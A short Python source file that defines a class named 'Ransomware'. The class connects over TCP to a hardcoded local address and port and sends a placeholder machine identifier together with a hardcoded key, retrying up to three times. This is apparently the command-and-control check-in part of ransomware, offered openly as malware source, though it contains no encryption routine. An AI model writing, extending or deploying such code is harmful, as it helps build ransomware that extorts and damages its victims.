# Import modules
from time import sleep
from socket import socket, AF_INET, SOCK_STREAM


class Ransomware:
    
    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self.key = b'ansfjinsdoifoiadfo'
        self.server: socket = socket(AF_INET, SOCK_STREAM)

    def ConnectServer(self, connected = False) -> None:
        retries = 0
        while not connected and retries < 3:
            try:
                self.server.connect((self.host, self.port))
                self.server.sendall(f'00:00:00:00|{self.key.decode("utf-8")}'.encode('utf-8'))
                connected = True
            except:
                retries += 1
                if retries < 3:
                    sleep(10)
                else:
                    pass
            finally:
                self.server.close()
    

if __name__ == '__main__':
    bot = Ransomware('192.168.1.12', 19100)
    bot.ConnectServer()